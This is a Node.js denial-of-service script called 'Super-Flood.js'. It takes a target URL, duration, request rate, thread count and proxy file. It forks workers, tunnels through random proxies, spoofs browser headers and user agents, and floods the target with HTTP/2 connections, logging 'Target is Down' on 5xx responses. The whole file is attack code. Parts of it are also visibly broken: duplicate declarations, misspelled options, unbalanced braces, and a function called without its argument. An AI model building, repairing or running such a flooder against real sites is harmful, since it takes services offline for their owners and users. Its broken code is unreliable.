const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const userAgents = require('user-agents');
const fs = require('fs');
const fakeUserAgent = require('fake-useragent');
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (err) {});

if (process.argv.length < 7) {
    console.log('Usage: node Super-Flood.js target time rate thread proxyfile');
    process.exit();
}

const proxyList = {};

function readProxyFile(filename) {
    return fs.readFileSync(filename, 'utf-8').toString().split(/\r?\n/);
}

function getRandomProxy(proxies) {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const generateRandomIP = () => {
    const randomByte = () => Math.floor(Math.random() * 255);
    return `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

let headerGenerator = new HeaderGenerator({
    browsers: [
        {
            name: 'chrome',
            minVersion: 80,
            maxVersion: 107,
            httpVersion: '2',
        },
    ],
    devices: ['desktop'],
    operatingSystems: ['windows'],
    locales: ['en-US', 'en'],
});

let headers = headerGenerator.getHeaders();

const cipherSuites = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

const sslCiphers = [
    'TLS_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_CHACHA20_POLY1305_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_128_CCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_128_CCM_8_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
];

const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

const acceptLanguages = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
];

const acceptEncodings = ['deflate, gzip, br', 'gzip', 'deflate', 'br'];
const cacheControls = ['no-cache', 'max-age=0'];

const referrerUrls = [
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
];

const specialCharacters = ['', '&', '', '&&', 'and', '=', '+', '?'];

const randomNumbers = ['1', '2', '3', '4', '5', '6'];

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
    // ... and so on
];

var targetStatus = {};

const proxyList = readProxyFile(proxyFile);

const targetUrl = url.parse(target);

if (cluster.isMaster) {
    for (let i = 1; i <= threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(sendRequests, 1000);
}

class ProxyClient {
    constructor() {}

    HTTP(proxy, callback) {
        const proxyAddress = proxy.address.split(':');
        const proxyHost = proxyAddress[0];
        const proxyPort = proxyAddress[1];

        const request = `CONNECT ${proxy.address}:443 HTTP/1.1\r\nHost: ${proxy.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const requestData = Buffer.from(request);

        const proxySocket = new net.Socket();

        proxySocket.setTimeout(proxy.timeout * 100000);
        proxySocket.setKeepAlive(true, 100000);

        proxySocket.on('connect', () => {
            proxySocket.write(requestData);
        });

        proxySocket.on('data', (data) => {
            const response = data.toString('utf-8');
            const isInvalidResponse =
                response.includes('HTTP/1.1 429') ||
                response.includes('HTTP/1.1 503') ||
                response.includes('HTTP/1.1 305') ||
                response.includes('HTTP/1.1 307') ||
                response.includes('HTTP/1.1 302') ||
                response.includes('HTTP/1.1 522');

            if (isInvalidResponse) {
                proxySocket.destroy();
                callback(undefined, 'error: invalid response from proxy server');
            } else {
                callback(proxySocket, undefined);
            }
        });

        proxySocket.on('timeout', () => {
            proxySocket.destroy();
            callback(undefined, 'error: timeout exceeded');
        });

        proxySocket.on('error', (error) => {
            proxySocket.destroy();
            callback(undefined, 'error: ' + error);
        });
    }
}

function sendRequests() {
    const randomProxy = getRandomProxy(proxyList);
    const proxyAddress = randomProxy.split(':');
    const proxyHost = proxyAddress[0];
    const proxyPort = parseInt(proxyAddress[1]);

    const proxy = {
        host: proxyHost,
        port: proxyPort,
        address: targetUrl.host + ':443',
        timeout: 100,
    };

    const proxyClient = new ProxyClient();

    proxyClient.HTTP(proxy, (socket, error) => {
        if (error) {
            return;
        }

        socket.setKeepAlive(true, 600000);
            
 const requestOptions = {
    host: targetUrl.host,
    ecdhCurve: 'prime256v1:X25519',
    ciphers: tls.getCiphers().join(':') + sslCiphers,
    secureProtocol: [
        'TLSv1_2_method',
        'TLSv1_3_methd',
        'SSL_OP_NO_SSLv3',
        'SSL_OP_NO_SSLv2',
        'TLS_OP_NO_TLS_1_1',
        'TLS_OP_NO_TLS_1_0',
    ],
    sigals: cipherSuites,
    servername: targetUrl.host,
    challengesToSolve: Infinity,
    resolveWithFullResponse: true,
    cloudflareTimeout: 5000,
    cloudflareMaxTimeout: 30000,
    maxRedirects: Infinity,
    followAllRedirects: true,
    decodeEmails: false,
    gzip: true,
    servername: targetUrl.host,
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2'],
    socket: socket,
};

const tlsSocket = tls.connect(443, targetUrl.host, requestOptions);
tlsSocket.setKeepAlive(true, 100000);

tlsSocket.on('connect', () => {
    const interval = setInterval(() => {
        for (let i = 0; i < rate; i++) {
            const request = http2.connect(targetUrl.href, requestOptions);
            request.on('response', (response) => {
                request.close();
                request.destroy();
                return;
            });
            request.end();
        }
    }, 1000);
});

tlsSocket.on('close', () => {
    tlsSocket.destroy();
    socket.destroy();
    return;
});

tlsSocket.on('error', (error) => {
    tlsSocket.destroy();
    socket.destroy();
    return;
});
}

(function (response, proxySocket, socket) {
    if (response.statusCode == 200) {
        console.log('Status 200');
    } else {
        if (
            response.statusCode == 502 ||
            response.statusCode == 503 ||
            response.statusCode == 504 ||
            response.statusCode == 520 ||
            response.statusCode == 525 ||
            response.statusCode == 522
        ) {
            console.log('Target is Down');
        }
    }
})();
}

const exit = () => process.exit(1);
setTimeout(exit, time * 1000);